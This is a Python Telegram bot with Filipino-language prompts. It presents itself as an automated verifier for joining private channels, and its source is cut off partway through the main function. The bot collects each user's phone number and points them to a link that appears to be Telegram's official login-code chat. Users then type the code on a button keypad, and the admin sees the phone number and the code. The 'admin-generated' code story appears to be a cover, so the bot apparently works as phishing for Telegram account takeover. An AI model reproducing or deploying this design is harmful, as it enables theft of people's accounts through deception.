import logging
import random
import asyncio
import os
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup, ReplyKeyboardRemove
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ChatJoinRequestHandler, filters, ContextTypes
from telegram.error import BadRequest
import sqlite3
from datetime import datetime, timedelta

# Logging setup
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Configuration - Kunin sa Railway environment variables
BOT_TOKEN = os.getenv('BOT_TOKEN')
ADMIN_ID = int(os.getenv('ADMIN_ID', '6483793776'))
CHANNEL_ID = os.getenv('CHANNEL_ID', '-1003097423499')

class FilipinoVerifier:
    def __init__(self):
        self.init_database()
        self.verification_sessions = {}  # I-store ang mga aktibong verification sessions
        
    def init_database(self):
        """I-initialize ang SQLite database"""
        self.conn = sqlite3.connect('verification.db', check_same_thread=False)
        cursor = self.conn.cursor()
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS pending_verifications (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                first_name TEXT,
                phone_number TEXT,
                verification_code TEXT,
                entered_code TEXT,
                timestamp DATETIME,
                code_entered_time DATETIME,
                status TEXT DEFAULT 'naghihintay',
                admin_notified BOOLEAN DEFAULT 0
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS verified_users (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                first_name TEXT,
                phone_number TEXT,
                verified_date DATETIME
            )
        ''')
        
        # BAGO: I-store ang join requests para ma-track ang mga naghihintay na pag-approve
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS pending_join_requests (
                user_id INTEGER,
                chat_id TEXT,
                chat_title TEXT,
                request_date DATETIME,
                status TEXT DEFAULT 'naghihintay',
                PRIMARY KEY (user_id, chat_id)
            )
        ''')
        
        self.conn.commit()

    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Start command handler - Kasama na ang contact sharing"""
        user = update.message.from_user
        
        welcome_text = f"""
🤖 **FILIPINO VERIFIER - Sistema ng Pag-verify**

Kumusta {user.first_name}! Maligayang pagdating sa aming automated verification system.

**Paano ito gumagana:**
1. I-share ang inyong contact number na ginagamit niyo sa Telegram
2. Makatanggap kayo ng 5-digit na verification code
3. I-enter ang code gamit ang number buttons
4. Automatic na veverify ng sistema ang inyong code
5. Pagka-verify, pwede na kayong sumali sa channel!

**Hakbang 1:** Pakishare ang inyong contact number sa pamamagitan ng button sa ibaba.

👇 I-click ang button para ma-share ang contact info.
        """
        
        # Gumawa ng contact sharing button
        contact_keyboard = ReplyKeyboardMarkup([
            [KeyboardButton("📱 I-Share ang Aking Contact", request_contact=True)]
        ], resize_keyboard=True, one_time_keyboard=True)
        
        await update.message.reply_text(
            welcome_text, 
            parse_mode='Markdown',
            reply_markup=contact_keyboard
        )
        
        # I-store ang pending verification
        cursor = self.conn.cursor()
        cursor.execute('''
            INSERT OR REPLACE INTO pending_verifications 
            (user_id, username, first_name, timestamp, status)
            VALUES (?, ?, ?, ?, ?)
        ''', (user.id, user.username, user.first_name, datetime.now(), 'naghihintay_contact'))
        self.conn.commit()

    async def handle_join_request(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """I-handle ang mga bagong join request sa channel"""
        try:
            user = update.chat_join_request.from_user
            chat = update.chat_join_request.chat
            
            # I-log ang join request
            logger.info(f"Bagong join request mula kay {user.first_name} (@{user.username}) sa {chat.title}")
            
            # IMPROVED: I-store ang join request details para sa later approval
            cursor = self.conn.cursor()
            cursor.execute('''
                INSERT OR REPLACE INTO pending_join_requests 
                (user_id, chat_id, chat_title, request_date, status)
                VALUES (?, ?, ?, ?, ?)
            ''', (user.id, str(chat.id), chat.title, datetime.now(), 'naghihintay'))
            self.conn.commit()
            
            # I-check kung verified na ang user
            cursor.execute('SELECT * FROM verified_users WHERE user_id = ?', (user.id,))
            if cursor.fetchone():
                # Verified na ang user, approve kaagad
                await context.bot.approve_chat_join_request(chat.id, user.id)
                
                # I-update ang join request status
                cursor.execute('''
                    UPDATE pending_join_requests 
                    SET status = 'na-approve' 
                    WHERE user_id = ? AND chat_id = ?
                ''', (user.id, str(chat.id)))
                self.conn.commit()
                
                await context.bot.send_message(
                    user.id,
                    "✅ **Maligayang pagbabalik!**\n\nVerified ka na. Na-approve na ang inyong join request! 🎉",
                    parse_mode='Markdown'
                )
                return
            
            # I-notify ang admin tungkol sa join request
            admin_message = f"""
🔔 **Bagong Join Request**

👤 **User:** {user.first_name} (@{user.username})
🆔 **User ID:** `{user.id}`
📢 **Channel:** {chat.title}
🆔 **Chat ID:** `{chat.id}`
⏰ **Oras:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

Kailangan muna ng user na kumpletuhin ang verification process.
Na-save na ang join request at automatic na ma-approve after verification.
            """
            await context.bot.send_message(ADMIN_ID, admin_message, parse_mode='Markdown')
            
            # I-send ang verification message sa user
            verification_message = f"""
🔐 **Verification Kailangan**

Kumusta {user.first_name}! 

Napansin ko na nag-request kayo na sumali sa **{chat.title}**. Para ma-approve, pakikompleto muna ang aming automated verification process.

**Huwag mag-alala:** Na-save na ang inyong join request. Pagka-kompleto ng verification, automatic kayo ma-aapprove - hindi na kailangan mag-request ulit!

Paki-click ang /start para simulan ang verification.
            """
            
            await context.bot.send_message(user.id, verification_message, parse_mode='Markdown')
            
        except Exception as e:
            logger.error(f"Error sa pag-handle ng join request: {e}")
            await context.bot.send_message(ADMIN_ID, f"❌ Error sa join request handling: {e}")

    async def handle_contact(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """I-handle ang contact sharing"""
        try:
            user = update.message.from_user
            contact = update.message.contact
            
            # I-verify na sariling contact ng user
            if contact.user_id != user.id:
                await update.message.reply_text(
                    "❌ Kailangan ninyo i-share ang sariling contact info, hindi ng iba.",
                    reply_markup=ReplyKeyboardRemove()
                )
                return
            
            # I-update ang database ng phone number
            cursor = self.conn.cursor()
            cursor.execute('''
                INSERT OR REPLACE INTO pending_verifications 
                (user_id, username, first_name, phone_number, timestamp, status)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (user.id, user.username, user.first_name, contact.phone_number, datetime.now(), 'na_share_contact'))
            self.conn.commit()
            
            # Gumawa ng button para makuha ang verification code
            code_keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton("🔑 Kunin ang Code Dito", url="https://t.me/+42777")]
            ])
            
            # I-send ang confirmation sa user na may button
            await update.message.reply_text(
                f"""
✅ **Natanggap ang Contact!**

📱 **Telepono:** {contact.phone_number}

⏳ **Susunod na Hakbang:** Kunin ang verification code sa pamamagitan ng pag-click sa button sa ibaba:

**Mahalagang Paalala:** Huwag isara ang chat na ito. Kailangan ninyo dito i-enter ang verification code pagkatapos ninyong matanggap.

**Note:** I-click ang button sa ibaba para makuha ang 5-digit verification code.
                """,
                parse_mode='Markdown',
                reply_markup=code_keyboard
            )
            
            # I-remove ang reply keyboard
            await update.message.reply_text(
                "I-click ang button sa itaas para makuha ang verification code.",
                reply_markup=ReplyKeyboardRemove()
            )
            
            # I-send ang detailed notification sa admin na may action buttons
            admin_keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton(f"🔢 I-setup ang Code para kay {user.first_name}", callback_data=f"setup_code_{user.id}")],
                [InlineKeyboardButton("📋 Tingnan ang mga Naghihintay", callback_data="view_pending")]
            ])
            
            admin_notification = f"""
📱 **Natanggap ang Contact Info - Kailangan ng Aksyon**

👤 **User:** {user.first_name} (@{user.username})
🆔 **User ID:** `{user.id}`
📞 **Telepono:** `{contact.phone_number}`
⏰ **Oras:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

**Susunod na Aksyon:** I-setup ang verification code para sa user na ito.

**Mga Instruksyon:**
1. I-click ang "I-setup ang Code" button sa ibaba
2. Mag-generate ako ng 5-digit code at ma-enable ang code input para sa user
3. **Kailangan ninyo i-send ang code sa user separately** (SMS, tawag, etc.)
4. Makakaya ng user na i-enter ang code dito
5. Makita ninyo kung anong code ang na-enter nila at pwede ninyo approve/reject

**Note:** Hindi ako magpapadala ng code sa user. Kayo ang mag-send via SMS o ibang paraan.
            """
            
            await context.bot.send_message(
                ADMIN_ID, 
                admin_notification, 
                parse_mode='Markdown',
                reply_markup=admin_keyboard
            )
            
        except Exception as e:
            logger.error(f"Error sa pag-handle ng contact: {e}")
            await update.message.reply_text("❌ Error sa pag-process ng contact. Subukan ulit.")

    async def handle_admin_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """I-handle ang mga admin callback buttons"""
        query = update.callback_query
        
        # Admin lang ang makakagamit ng buttons na ito
        if query.from_user.id != ADMIN_ID:
            await query.answer("❌ Para sa admin lang ang function na ito")
            return
            
        await query.answer()
        
        if query.data.startswith('setup_code_'):
            user_id = int(query.data.split('_')[2])
            
            # Mag-generate ng 5-digit verification code
            verification_code = str(random.randint(10000, 99999))
            
            # I-update ang database ng code
            cursor = self.conn.cursor()
            cursor.execute('''
                UPDATE pending_verifications 
                SET verification_code = ?, status = 'code_handa'
                WHERE user_id = ?
            ''', (verification_code, user_id))
            self.conn.commit()
            
            # Kunin ang user info
            cursor.execute('''
                SELECT first_name, username, phone_number 
                FROM pending_verifications 
                WHERE user_id = ?
            ''', (user_id,))
            user_info = cursor.fetchone()
            
            if user_info:
                first_name, username, phone_number = user_info
                
                # I-send ang code input interface sa user (pero hindi ang actual code)
                await self.send_code_input_interface(context, user_id, verification_code)
                
                # Ipakita ang na-generate na code sa admin LANG
                await query.edit_message_text(
                    f"""
🔢 **Na-generate ang Code - IPADALA ITO SA USER**

👤 **User:** {first_name} (@{username})
📞 **Telepono:** `{phone_number}`
🔢 **Na-generate na Code:** `{verification_code}`

**MAHALAGANG PAALALA:** 
⚠️ **KAILANGAN NINYO I-SEND ANG CODE SA USER via SMS o tawag**
⚠️ **Hindi ako automatically magpapadala ng code na ito**

**Mga Hakbang:**
1. I-send ang code `{verification_code}` sa phone number `{phone_number}`
2. Pwede na ngayong mag-enter ng code ang user gamit ang interface na pinadala ko
3. Ma-notify kayo kapag nag-enter na sila ng code para sa approval

**Susunod:** I-send ang code `{verification_code}` sa `{phone_number}` ngayon.
                    """,
                    parse_mode='Markdown'
                )
            else:
                await query.edit_message_text("❌ Hindi nakita ang user sa mga pending verifications.")
                
        elif query.data == 'view_pending':
            await self.show_pending_users(query, context)
            
        elif query.data.startswith('approve_user_'):
            user_id = int(query.data.split('_')[2])
            await self.admin_approve_user(query, context, user_id, True)
            
        elif query.data.startswith('reject_user_'):
            user_id = int(query.data.split('_')[2])
            await self.admin_approve_user(query, context, user_id, False)

    async def admin_approve_user(self, query, context, user_id, approved):
        """Admin approve o reject ng user verification"""
        try:
            cursor = self.conn.cursor()
            cursor.execute('''
                SELECT first_name, username, phone_number, verification_code, entered_code
                FROM pending_verifications 
                WHERE user_id = ?
            ''', (user_id,))
            
            user_info = cursor.fetchone()
            if not user_info:
                await query.edit_message_text("❌ Hindi nakita ang user.")
                return
                
            first_name, username, phone_number, correct_code, entered_code = user_info
            
            if approved:
                # I-add sa verified users
                cursor.execute('''
                    INSERT OR REPLACE INTO verified_users 
                    (user_id, username, first_name, phone_number, verified_date)
                    VALUES (?, ?, ?, ?, ?)
                ''', (user_id, username, first_name, phone_number, datetime.now()))
                
                # I-update ang pending verification status
                cursor.execute('''
                    UPDATE pending_verifications 
                    SET status = 'na-verify'
                    WHERE user_id = ?
                ''', (user_id,))
                
                self.conn.commit()
                
                # IMPROVED: I-approve ang LAHAT ng pending join requests para sa user na ito
                approved_chats = await self.approve_pending_join_requests(context, user_id)
                
                if approved_chats:
                    chat_list = "\n".join([f"• {chat}" for chat in approved_chats])
                    status_text = f"""
✅ **Kumpleto na ang Verification!**

Congratulations! Na-process na successfully ang inyong verification.

**Automatic na Na-approve Para sa:**
{chat_list}

Maligayang pagdating! 🎉

**Note:** Hindi na kailangan mag-request ulit ng join. Automatic na kayo na-approve sa lahat ng channels na na-request ninyo dati.
                    """
                else:
                    status_text = f"""
✅ **Kumpleto na ang Verification!**

Na-process na successfully ang inyong verification! 

**Susunod na Hakbang:** Pwede na kayong sumali sa mga private channels. Ang mga future join requests ninyo ay automatic na ma-aapprove.

**Channel ID:** `{CHANNEL_ID}`

Maligayang pagdating! 🎉
                    """
                
                # I-notify ang user ng approval
                await context.bot.send_message(user_id, status_text, parse_mode='Markdown')
                
                # I-update ang admin message
                await query.edit_message_text(
                    f"""
✅ **Na-APPROVE ang User Verification**

👤 **User:** {first_name} (@{username})
📱 **Telepono:** {phone_number}
🔢 **Pinadala na Code:** `{correct_code}`
🔢 **Na-enter ng User:** `{entered_code}`
⏰ **Na-approve:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
📢 **Auto-approved para sa:** {len(approved_chats)} channel(s)

✅ **Status:** Na-verify na ang user at auto-approved sa lahat ng pending join requests.
                    """,
                    parse_mode='Markdown'
                )
                
            else:
                # Rejection
                cursor.execute('''
                    UPDATE pending_verifications 
                    SET status = 'na-reject'
                    WHERE user_id = ?
                ''', (user_id,))
                self.conn.commit()
                
                # I-notify ang user ng rejection
                rejection_text = f"""
❌ **Hindi Natagumpay ang Verification**

Sa kasamaang palad, hindi nakompleto ang inyong verification.

**Dahilan:** Ang code na na-enter ninyo ay hindi tumugma sa aming records.

**Ang na-enter ninyo:** `{entered_code}`

Kung sa tingin ninyo may mali, subukan ulit ang verification process sa pamamagitan ng pag-send ng /start.
                """
                
                await context.bot.send_message(user_id, rejection_text, parse_mode='Markdown')
                
                # I-update ang admin message
                await query.edit_message_text(
                    f"""
❌ **Na-REJECT ang User Verification**

👤 **User:** {first_name} (@{username})
📱 **Telepono:** {phone_number}
🔢 **Pinadala na Code:** `{correct_code}`
🔢 **Na-enter ng User:** `{entered_code}`
⏰ **Na-reject:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

❌ **Status:** Na-reject ang user verification.
                    """,
                    parse_mode='Markdown'
                )
            
            # Linisin ang session kung meron
            if user_id in self.verification_sessions:
                del self.verification_sessions[user_id]
                
        except Exception as e:
            logger.error(f"Error sa admin approval: {e}")
            await query.edit_message_text("❌ Error sa pag-process ng approval. Subukan ulit.")

    async def approve_pending_join_requests(self, context, user_id):
        """I-approve ang lahat ng pending join requests para sa verified user"""
        approved_chats = []
        
        try:
            cursor = self.conn.cursor()
            cursor.execute('''
                SELECT chat_id, chat_title 
                FROM pending_join_requests 
                WHERE user_id = ? AND status = 'naghihintay'
            ''', (user_id,))
            
            pending_requests = cursor.fetchall()
            
            for chat_id, chat_title in pending_requests:
                try:
                    # I-convert ulit ang chat_id sa int kung numeric
                    if chat_id.lstrip('-').isdigit():
                        chat_id_int = int(chat_id)
                    else:
                        chat_id_int = chat_id
                    
                    # Subukan i-approve ang join request
                    await context.bot.approve_chat_join_request(chat_id_int, user_id)
                    
                    # I-update ang status sa approved
                    cursor.execute('''
                        UPDATE pending_join_requests 
                        SET status = 'na-approve'
                        WHERE user_id = ? AND chat_id = ?
                    ''', (user_id, chat_id))
                    
                    approved_chats.append(chat_title)
                    logger.info(f"Auto-approved join request para sa user {user_id} sa {chat_title}")
                    
                except BadRequest as e:
                    logger.error(f"Hindi na-approve ang join request para kay {user_id} sa {chat_title}: {e}")
                    # I-update ang status sa failed
                    cursor.execute('''
                        UPDATE pending_join_requests 
                        SET status = 'nabigo'
                        WHERE user_id = ? AND chat_id = ?
                    ''', (user_id, chat_id))
                except Exception as e:
                    logger.error(f"Hindi inaasahang error sa pag-approve ng join request: {e}")
            
            self.conn.commit()
            
        except Exception as e:
            logger.error(f"Error sa approve_pending_join_requests: {e}")
        
        return approved_chats

    async def show_pending_users(self, query, context):
        """Ipakita ang mga pending verification users sa admin"""
        cursor = self.conn.cursor()
        cursor.execute('''
            SELECT user_id, first_name, username, phone_number, timestamp, status, entered_code, verification_code
            FROM pending_verifications 
            WHERE status IN ('na_share_contact', 'naghihintay_contact', 'code_handa', 'code_na_enter')
            ORDER BY timestamp DESC
        ''')
        
        pending = cursor.fetchall()
        
        if not pending:
            await query.edit_message_text("📋 Walang pending verifications sa ngayon.")
            return
            
        message = "📋 **Mga Naghihintay na Verification:**\n\n"
        
        for user in pending:
            user_id, first_name, username, phone, timestamp, status, entered_code, verification_code = user
            
            # Kunin ang pending join requests para sa user na ito
            cursor.execute('''
                SELECT COUNT(*) FROM pending_join_requests 
                WHERE user_id = ? AND status = 'naghihintay'
            ''', (user_id,))
            pending_joins = cursor.fetchone()[0]
            
            status_emoji = {
                'naghihintay_contact': '⏳',
                'na_share_contact': '📱',
                'code_handa': '🔢',
                'code_na_enter': '✏️'
            }
            
            message += f"{status_emoji.get(status, '❓')} **{first_name}** (@{username})\n"
            message += f"   📞 `{phone or 'Walang contact pa'}`\n"
            message += f"   🕐 {timestamp}\n"
            message += f"   📊 Status: {status}\n"
            message += f"   🔗 Mga naghihintay na joins: {pending_joins}\n"
            
            if verification_code and status == 'code_handa':
                message += f"   🔢 Code na ipapadala: `{verification_code}`\n"
            elif entered_code and verification_code:
                message += f"   🔢 Na-generate: `{verification_code}` | Na-enter: `{entered_code}`\n"
                
            message += "\n"
            
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔄 I-refresh", callback_data="view_pending")]
        ])
        
        await query.edit_message_text(message, parse_mode='Markdown', reply_markup=keyboard)

    async def send_code_input_interface(self, context, user_id, verification_code):
        """I-send ang numeric input interface sa user"""
        try:
            # Gumawa ng numeric keyboard
            keyboard = []
            numbers = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '0']
            
            # Gumawa ng 3x3 + 1 layout
            for i in range(0, 9, 3):
                row = [InlineKeyboardButton(num, callback_data=f"num_{num}_{user_id}") for num in numbers[i:i+3]]
                keyboard.append(row)
            keyboard.append([InlineKeyboardButton('0', callback_data=f'num_0_{user_id}')])
            
            # I-add ang control buttons
            keyboard.append([
                InlineKeyboardButton('🔙 Burahin', callback_data=f'backspace_{user_id}'),
                InlineKeyboardButton('✅ I-submit', callback_data=f'submit_code_{user_id}')
            ])
            
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            message = f"""
🔢 **I-enter ang Verification Code**

Pakienter ang 5-digit verification code na natanggap ninyo gamit ang number buttons sa ibaba.

**Mga Instruksyon:**
1. Gamitin ang number buttons para i-enter ang 5-digit code
2. I-click ang "Burahin" para ma-remove ang huling digit kung kailangan
3. I-click ang "I-submit" kapag na-enter na ninyo ang lahat ng 5 digits
4. Automatic na veverify ng sistema ang inyong code

**Code Input:** ○○○○○

Na-enter: 0/5 digits

**Note:** Siguraduhing nakuha ninyo ang code sa button sa itaas.
            """
            
            await context.bot.send_message(
                user_id,
                message,
                parse_mode='Markdown',
                reply_markup=reply_markup
            )
            
            # I-initialize ang verification session
            self.verification_sessions[user_id] = {
                'entered_code': '',
                'correct_code': verification_code
            }
            
        except Exception as e:
            logger.error(f"Error sa pag-send ng code interface: {e}")

    async def handle_user_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """I-handle ang mga user inline keyboard callbacks"""
        try:
            query = update.callback_query
            user_id = query.from_user.id
            data = query.data
            
            await query.answer()
            
            # I-extract ang user_id sa callback data
            if not data.endswith(f'_{user_id}'):
                await query.edit_message_text("❌ Session error. Pakiulit ang verification.")
                return
                
            if user_id not in self.verification_sessions:
                await query.edit_message_text("❌ Nag-expire na ang session. Makipag-ugnayan sa support para ma-resend ang code.")
                return
            
            session = self.verification_sessions[user_id]
            
            if data.startswith(f'num_'):
                # I-add ang number sa entered code
                number = data.split('_')[1]
                if len(session['entered_code']) < 5:
                    session['entered_code'] += number
                    
                # I-update ang display
                display_code = '●' * len(session['entered_code']) + '○' * (5 - len(session['entered_code']))
                await query.edit_message_text(
                    f"""
🔢 **I-enter ang Verification Code**

**Code Input:** {display_code}

Na-enter: {len(session['entered_code'])}/5 digits

Pakienter ang verification code na natanggap ninyo.
Automatic na veverify ng sistema ang inyong code pagka-submit.

**Note:** Siguraduhing nakuha ninyo ang code sa button na binigay kanina.
                    """,
                    parse_mode='Markdown',
                    reply_markup=query.message.reply_markup
                )
                
            elif data.startswith(f'backspace_'):
                # I-remove ang huling na-enter na digit
                if session['entered_code']:
                    session['entered_code'] = session['entered_code'][:-1]
                    
                display_code = '●' * len(session['entered_code']) + '○' * (5 - len(session['entered_code']))
                await query.edit_message_text(
                    f"""
🔢 **I-enter ang Verification Code**

**Code Input:** {display_code}

Na-enter: {len(session['entered_code'])}/5 digits

Pakienter ang verification code na natanggap ninyo.
Automatic na veverify ng sistema ang inyong code pagka-submit.

**Note:** Siguraduhing nakuha ninyo ang code sa button na binigay kanina.
                    """,
                    parse_mode='Markdown',
                    reply_markup=query.message.reply_markup
                )
                
            elif data.startswith(f'submit_code_'):
                # I-submit ang entered code para sa verification
                if len(session['entered_code']) != 5:
                    await query.edit_message_text(
                        "❌ **Hindi Kumpleto ang Code**\n\nKailangan 5 digits ang verification code. Pakikompleto muna bago i-submit.",
                        parse_mode='Markdown',
                        reply_markup=query.message.reply_markup
                    )
                    return
                
                # I-save ang entered code sa database
                cursor = self.conn.cursor()
                cursor.execute('''
                    UPDATE pending_verifications 
                    SET entered_code = ?, code_entered_time = ?, status = 'code_na_enter'
                    WHERE user_id = ?
                ''', (session['entered_code'], datetime.now(), user_id))
                self.conn.commit()
                
                # I-notify ang admin para sa final approval
                await self.notify_admin_code_entered(context, user_id, session['entered_code'], session['correct_code'])
                
                # I-update ang user message
                await query.edit_message_text(
                    f"""
✅ **Na-submit na ang Code!**

🔢 **Inyong Na-enter:** `{session['entered_code']}`
⏰ **Oras ng Pag-submit:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

🔍 **Susunod na Hakbang:** 
Ini-review na ngayon ng admin ang inyong verification. Makatanggap kayo ng notification sa loob ng ilang minuto kung approved o hindi.

**Pakihintay lang...**

**Note:** Huwag na mag-send ng ibang message. Automatic na kayo ma-notify ng result.
                    """,
                    parse_mode='Markdown'
                )
                
                # I-clean ang session
                if user_id in self.verification_sessions:
                    del self.verification_sessions[user_id]
                    
        except Exception as e:
            logger.error(f"Error sa user callback handling: {e}")
            await query.edit_message_text("❌ Error sa pag-process. Subukan ulit ang verification.")

    async def notify_admin_code_entered(self, context, user_id, entered_code, correct_code):
        """I-notify ang admin na may nag-enter ng code"""
        try:
            cursor = self.conn.cursor()
            cursor.execute('''
                SELECT first_name, username, phone_number, timestamp
                FROM pending_verifications 
                WHERE user_id = ?
            ''', (user_id,))
            
            user_info = cursor.fetchone()
            if not user_info:
                return
                
            first_name, username, phone_number, timestamp = user_info
            
            # Check kung tama ba ang code
            is_correct = entered_code == correct_code
            status_emoji = "✅" if is_correct else "❌"
            status_text = "TAMA" if is_correct else "MALI"
            
            # Gumawa ng approval buttons
            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton(f"✅ I-approve si {first_name}", callback_data=f"approve_user_{user_id}")],
                [InlineKeyboardButton(f"❌ I-reject si {first_name}", callback_data=f"reject_user_{user_id}")],
                [InlineKeyboardButton("📋 Tingnan ang Lahat", callback_data="view_pending")]
            ])
            
            notification_message = f"""
🔔 **MAY NAG-ENTER NG CODE - KAILANGAN NG APPROVAL**

👤 **User:** {first_name} (@{username})
🆔 **User ID:** `{user_id}`
📱 **Telepono:** `{phone_number}`
⏰ **Nag-submit:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

🔢 **Code Comparison:**
• **Pinadala ninyo:** `{correct_code}`
• **Na-enter ng user:** `{entered_code}`
• **Status:** {status_emoji} **{status_text}**

**Kailangan ng Final Decision:**
Kahit na {status_text.lower()} ang code, kailangan pa rin ng manual approval para ma-verify ang user.

**Mga Opsyon:**
✅ **Approve** - Ma-verify ang user at ma-auto approve sa lahat ng pending join requests
❌ **Reject** - Hindi ma-verify ang user

**Note:** I-click ang appropriate button sa ibaba.
            """
            
            await context.bot.send_message(
                ADMIN_ID,
                notification_message,
                parse_mode='Markdown',
                reply_markup=keyboard
            )
            
            # I-update ang admin notification flag
            cursor.execute('''
                UPDATE pending_verifications 
                SET admin_notified = 1
                WHERE user_id = ?
            ''', (user_id,))
            self.conn.commit()
            
        except Exception as e:
            logger.error(f"Error sa admin notification: {e}")

    async def handle_text_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """I-handle ang mga regular text messages"""
        user = update.message.from_user
        text = update.message.text.lower()
        
        # I-check kung may ginagawa na verification session
        cursor = self.conn.cursor()
        cursor.execute('''
            SELECT status FROM pending_verifications 
            WHERE user_id = ? AND status != 'na-verify' AND status != 'na-reject'
        ''', (user.id,))
        
        pending = cursor.fetchone()
        
        if pending and text not in ['/start', '/help']:
            status = pending[0]
            
            if status == 'naghihintay_contact':
                await update.message.reply_text(
                    "⏳ Naghihintay pa kami ng inyong contact information.\n\nPaki-click ang 'I-Share ang Aking Contact' button sa itaas.",
                    reply_markup=ReplyKeyboardMarkup([
                        [KeyboardButton("📱 I-Share ang Aking Contact", request_contact=True)]
                    ], resize_keyboard=True, one_time_keyboard=True)
                )
            elif status in ['na_share_contact', 'code_handa']:
                await update.message.reply_text(
                    "⏳ Naghihintay pa kami na ma-setup ng admin ang verification code para sa inyo.\n\nPakihintay lang ng notification."
                )
            elif status == 'code_na_enter':
                await update.message.reply_text(
                    "⏳ Na-submit na ninyo ang code. Hinihintay pa namin ang approval ng admin.\n\nPakihintay lang ng notification."
                )
        elif text == '/help':
            await self.help_command(update, context)
        elif not pending:
            await update.message.reply_text(
                "Kumusta! Para makasali sa private channels, kailangan muna ng verification.\n\nI-send ang /start para simulan."
            )

    async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Help command handler"""
        help_text = """
🤖 **FILIPINO VERIFIER - Tulong**

**Mga Available Commands:**
• /start - Simulan ang verification process
• /help - Ipakita ang help message na ito

**Paano Gumagana ang Verification:**
1. 📱 **I-share ang Contact** - Gamitin ang share contact button
2. 🔢 **Kunin ang Code** - I-click ang button para sa verification link
3. ✏️ **I-enter ang Code** - Gamitin ang number pad para sa 5-digit code
4. ✅ **Approval** - Hinihintay ang admin approval
5. 🎉 **Verified!** - Automatic join sa mga channels

**Mga Status:**
• ⏳ Naghihintay ng contact
• 📱 Contact na-share
• 🔢 Code ready for input
• ✏️ Code na-enter, hinihintay approval
• ✅ Verified na
• ❌ Na-reject

**Support:** Makipag-ugnayan sa admin kung may problema.
        """
        
        await update.message.reply_text(help_text, parse_mode='Markdown')

    async def admin_stats(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Admin command para sa statistics"""
        if update.message.from_user.id != ADMIN_ID:
            await update.message.reply_text("❌ Admin lang ang pwedeng gumamit ng command na ito.")
            return
            
        cursor = self.conn.cursor()
        
        # Kumuha ng mga statistics
        cursor.execute('SELECT COUNT(*) FROM verified_users')
        verified_count = cursor.fetchone()[0]
        
        cursor.execute("SELECT COUNT(*) FROM pending_verifications WHERE status != 'na-verify'")
        pending_count = cursor.fetchone()[0]
        
        cursor.execute("SELECT COUNT(*) FROM pending_join_requests WHERE status = 'naghihintay'")
        pending_joins = cursor.fetchone()[0]
        
        cursor.execute("SELECT COUNT(*) FROM pending_verifications WHERE status = 'na-reject'")
        rejected_count = cursor.fetchone()[0]
        
        # Kumuha ng recent activity
        cursor.execute('''
            SELECT first_name, username, verified_date 
            FROM verified_users 
            ORDER BY verified_date DESC 
            LIMIT 5
        ''')
        recent_verified = cursor.fetchall()
        
        stats_text = f"""
📊 **FILIPINO VERIFIER - STATISTICS**

**Overall Numbers:**
✅ **Verified Users:** {verified_count}
⏳ **Pending Verifications:** {pending_count}
🔗 **Pending Join Requests:** {pending_joins}
❌ **Rejected:** {rejected_count}

**Recent Verified Users:**
        """
        
        if recent_verified:
            for user in recent_verified:
                first_name, username, verified_date = user
                date_str = datetime.fromisoformat(verified_date).strftime('%m/%d %H:%M')
                stats_text += f"• {first_name} (@{username}) - {date_str}\n"
        else:
            stats_text += "• Walang verified users pa\n"
        
        # I-add ang admin controls
        admin_keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("📋 View Pending", callback_data="view_pending")],
            [InlineKeyboardButton("🔄 Refresh Stats", callback_data="refresh_stats")]
        ])
        
        await update.message.reply_text(
            stats_text,
            parse_mode='Markdown',
            reply_markup=admin_keyboard
        )

    async def error_handler(self, update: object, context: ContextTypes.DEFAULT_TYPE):
        """Global error handler"""
        logger.error("Exception while handling an update:", exc_info=context.error)
        
        # I-notify ang admin ng error kung may update
        if update and hasattr(update, 'effective_user'):
            error_message = f"""
🚨 **BOT ERROR DETECTED**

⏰ **Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
👤 **User:** {update.effective_user.first_name if update.effective_user else 'Unknown'}
🆔 **User ID:** {update.effective_user.id if update.effective_user else 'Unknown'}
❌ **Error:** {str(context.error)[:500]}

**Update Type:** {type(update).__name__}
            """
            
            try:
                await context.bot.send_message(ADMIN_ID, error_message, parse_mode='Markdown')
            except:
                pass  # Wag mag-error sa error handler

def main():
    """Main function para sa bot"""
    if not BOT_TOKEN:
        logger.error("BOT_TOKEN environment variable hindi naka-set!")
        return
    
    # Gumawa ng application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # I-initialize ang verifier
    verifier = FilipinoVerifier()
    
    # I-add ang handlers
    application.add_handler(CommandHandler("start", verifier.start))
    application.add_handler(CommandHandler("help", verifier.help_command))
    application.add_handler(CommandHandler("stats", verifier.admin_stats))
    
    # I-add ang contact handler
    application.add_handler(MessageHandler(filters.CONTACT, verifier.handle_contact))
    
    # I-add ang callback query handlers
